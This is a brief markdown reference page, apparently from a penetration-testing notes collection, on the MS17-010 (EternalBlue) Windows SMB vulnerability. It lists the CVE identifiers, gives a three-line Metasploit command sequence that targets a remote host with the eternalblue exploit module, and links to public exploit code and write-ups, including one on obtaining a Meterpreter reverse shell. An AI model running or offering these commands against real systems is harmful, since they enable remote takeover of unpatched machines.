# MS17-010

- exp [FUZZBUNCH](https://github.com/exploitx3/FUZZBUNCH)

Vulnerability reference:
 * [MS17-010](https://technet.microsoft.com/library/security/ms17-010)
 * [CVE-2017-0143](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143)
 * [CVE-2017-0144](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144)
 * [CVE-2017-0145](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0145)
 * [CVE-2017-0146](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0146)
 * [CVE-2017-0148](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0148)
 * [CVE-2017-0147](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0147)

## Usage
```
msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(ms17_010_eternalblue) > set rhost 10.10.1.13
msf exploit(ms17_010_eternalblue) > run
```

## References

* [Windows2012上如何通过攻击ETERNALBLUE获得Meterpreter反弹](https://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw%3D%3D&mid=2247483946&idx=1&sn=cbe2e5a08470d699daeb74d7904581c7&scene=45#wechat_redirect)
* [MS17-017: Microsoft Windows 7 SP1 x86 Privilege Escalation Vulnerability](https://securityonline.info/ms17-017-microsoft-windows-7-sp1-x86-privilege-escalation-vulnerability/)  
* [AutoBlue-MS17-010 - an semi-automated fully working, no-bs, non-metasploit version of the public exploit code for MS17-010 AKA EternalBlue](https://github.com/3ndG4me/AutoBlue-MS17-010)
* [MS17-010 EternalSynergy / EternalRomance / EternalChampion aux+exploit modules #9473](https://github.com/rapid7/metasploit-framework/pull/9473)
* [worawit/MS17-010](https://github.com/worawit/MS17-010)
